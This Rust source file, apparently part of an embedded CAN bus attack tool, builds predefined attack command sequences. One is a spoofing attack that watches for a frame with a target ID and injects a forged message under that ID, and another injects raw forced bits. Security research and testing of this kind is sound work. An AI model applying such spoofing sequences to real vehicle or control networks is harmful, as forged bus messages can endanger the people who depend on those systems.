use super::{BuildError, HighLevelAttackCmd};
use embedded_can::Id;
use heapless::Vec;

pub enum PredefAttacks {
    TestAttack,
    SpoofingAttack {
        id: Id,
        spoof_data: Vec<u8, 8>,
        match_data: Vec<u8, 8>,
    },
}

impl PredefAttacks {
    pub fn build<const SIZE: usize>(
        self,
        hl_attack: &mut Vec<HighLevelAttackCmd, SIZE>,
    ) -> Result<usize, BuildError> {
        match self {
            PredefAttacks::TestAttack => self.build_test_attack(hl_attack),
            PredefAttacks::SpoofingAttack {
                id,
                ref spoof_data,
                ref match_data,
            } => self.build_spoofing_attack(hl_attack, id, spoof_data, match_data),
        }
    }

    fn build_spoofing_attack<const SIZE: usize>(
        &self,
        hl_attack: &mut Vec<HighLevelAttackCmd, SIZE>,
        id: Id,
        spoof_data: &Vec<u8, 8>,
        match_data: &Vec<u8, 8>,
    ) -> Result<usize, BuildError> {
        // Wait until start of frame
        hl_attack.push(HighLevelAttackCmd::WaitSof).unwrap();
        // Skip start of frame
        hl_attack
            .push(HighLevelAttackCmd::Wait { bits: 1 })
            .unwrap();
        // Match the target ID
        hl_attack
            .push(HighLevelAttackCmd::MatchId { id, rtr: false })
            .unwrap();
        // Match (or not) the data
        hl_attack
            .push(if match_data.len() > 0 {
                let mut data = [0; 8];
                for (index, elem) in match_data.iter().enumerate() {
                    data[index] = *elem;
                }

                HighLevelAttackCmd::MatchData {
                    data,
                    match_size: match_data.len() as u8,
                }
            } else {
                HighLevelAttackCmd::SkipData
            })
            .unwrap();

        // Wait for the end of the frame
        hl_attack.push(HighLevelAttackCmd::WaitEof).unwrap();
        // Send the actual message
        let mut data = [0; 8];
        for (index, byte) in spoof_data.iter().enumerate() {
            data[index] = *byte;
        }
        hl_attack
            .push(HighLevelAttackCmd::SendMsg {
                id,
                data: Some(data),
                data_len: spoof_data.len(),
                rtr: false,
                force: false,
            })
            .unwrap();

        Ok(6)
    }

    fn build_test_attack<const SIZE: usize>(
        &self,
        hl_attack: &mut Vec<HighLevelAttackCmd, SIZE>,
    ) -> Result<usize, BuildError> {
        hl_attack.push(HighLevelAttackCmd::WaitSof).unwrap();
        hl_attack
            .push(HighLevelAttackCmd::Wait { bits: 1 })
            .unwrap();
        hl_attack
            .push(HighLevelAttackCmd::SendRaw {
                bits: 0b101_0101,
                bits_count: 7,
                force: true,
            })
            .unwrap();

        Ok(2)
    }
}
